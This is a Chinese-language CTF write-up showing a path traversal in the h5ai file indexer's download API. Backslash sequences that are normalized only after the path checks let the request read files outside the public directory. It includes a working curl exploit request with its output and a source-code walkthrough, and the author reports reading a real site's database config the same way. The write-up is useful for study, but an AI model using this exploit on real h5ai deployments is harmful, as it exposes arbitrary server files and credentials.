 新手打 CTF，请多多指教。

## 超简易的网盘服务器

不同于官方题解，通过最新版程序本身存在的 bug（也有可能是 feature）来得到 flag。（还不是绕了个大弯子.jpg

### TL; DR

程序的 download API 在验证路径合法性后，猜想为兼容 Windows 反斜杠，通过 `preg_replace()` 替换掉了全部存在的 `\`, `\\` 到 `/` 。构造譬如 `./Public\\..\\flag.txt`  作为 href[0] 内容，即可越过 h5ai 自身的全部安全策略访问文件。

利用条件：在 Linux 下部署 h5ai、可以访问 `h5ai/public/index.php` ，不论设置 private/conf/options.json 中的密码与否。

### Exploit

```shell
➜  ~ curl -X 'POST' http://202.38.93.111:10120/Public/_h5ai/public/index.php --data-raw 'action=download&as=flag.tar&type=php-tar&baseHref=&hrefs[0]=/Public\\..\\flag.txt'
flag.txt0000755000000000000000000000003013744647043007622 0ustar00..flag{super_secure_cloud}
```

可以访问任意 PHP 执行用户所包含权限的文件。

### 调研过程

观察 /Public/dockerfile, 发现可读文件内有 /flag.txt。目录程序使用了 h5ai，我们下载一个与 dockerfile 内相同版本的程序来调查。

首先从 public/index.php:17 入口文件包含的 Bootstrap::run() 开始看。在 private/php/class-bootstrap.php:L18 发现，当 REQUEST_METHOD 为 post 时将进入 API 请求。

跟进 `(new Api($context))->apply();` 到 private/core/class-api.php:L14, 观察到 HTTP GET 参数中的 action 支持四种：download/get/login/logout。到这里，最终请求中的第一个参数出来了：`action=download`

继续跟进 private/core/class-api.php:L37 的 `$ok = $archive->output($type, $base_href, $hrefs);`，我们把重点放在 private/ext/class-archive.php:L19 开始的 output 函数逻辑上。

![image-20201107152527040](/Users/victor/Library/Application Support/typora-user-images/image-20201107152527040.png)



- 上图中，第 20~23 行是对 HTTP 请求中 base_href 参数的检查，这里我们先置空此参数。（但和后面的过程同样，存在安全问题）

- 第 25~26 行给私有实例变量 dirs, files 初始化空值，这两个变量在之后会直接给到生成压缩包的函数，生成压缩包时遍历变量值，提取全部文件。
- 第 28 行为 h5ai 程序对入参 hrefs 数组的安全检查和路径解析。
- 我们先看后面的几行，到函数结束前都做了些什么：
  - 第 30-36 行在 28 行的解析之后，若请求之初参数内合法目录数量或文件数量均为 0，则添加 base_path（后续调研查找到值为 /var/www/html/Public/），否则不执行。
  - 第 38-44 行根据入参选择的压缩方式创建压缩包并返回到 class-api.php:L39 进行下一步处理（后续调研发现，之后会直接返回压缩包内容）

现在回到 `$this->add_hrefs($hrefs);` ，跟进 add_hrefs 跳转到 class-archive.php:L137-L158。

![image-20201107155036826](/Users/victor/Library/Application Support/typora-user-images/image-20201107155036826.png)



这段代码对入参中的每一个 hrefs 进行解析。由于我们只需要获取 flag.txt，因此只会有一条路径作为 hrefs 数组的内容。接下来，假如请求的 hrefs[0] 为 `/Public/nginx.conf`：

- 首先对文件路径的文件夹名（/Public）使用 Util::normalize_path 方法，并在 146 行检查是否在程序的管理范围内：`$this->context->is_managed_href($d)` 。is_managed_href 中（class-context:L130）会调用以下检查和解析：
  - class-context:L92 的 to_path(\$href) 会通过 substr() 方法，取得 `$rel_href` 相对 ROOT_HREF （这里为 `/Public/`） 的路径（因为 nginx.conf 相对 /Public/ 在根目录 / 下，所以这里渠道 $rel_href = '/'。
  - class-util.php:L12 `$path = preg_replace('#[\\\\/]+#', '/', $path);`
  - 之后对 ROOT_PATH . '/' . rawurldecode($rel_href) 进行 Util:normalize_path 操作。
  - 接着，对路径进行系列安全验证 class-context.php:134-164，分别检查是否包含 '../' 或 '/..'、是否为'..'、路径是否为 PUBLIC_PATH/PRIVATE_PATH 的子集等。

截至目前，程序都没有对 `\\..`, `..\\` 等进行检查，或在转换后，对请求的 href 后半部分进行检查（对前半部分是有检查的）。而下一步就是直接添加到打包的路径中。

如果我们构造路径：`/Public\\..\\flag.txt`，此时经过 normalize 后 `$d = /Public/../../` ，程序的 is_managed_path 将判定为合法路径。

在我自己的 blog 所在目录下新建一个 Public 目录，在 Public 目录下搭建 h5ai 软件，经检查可以直接下载到 blog 根目录下的数据库连接配置。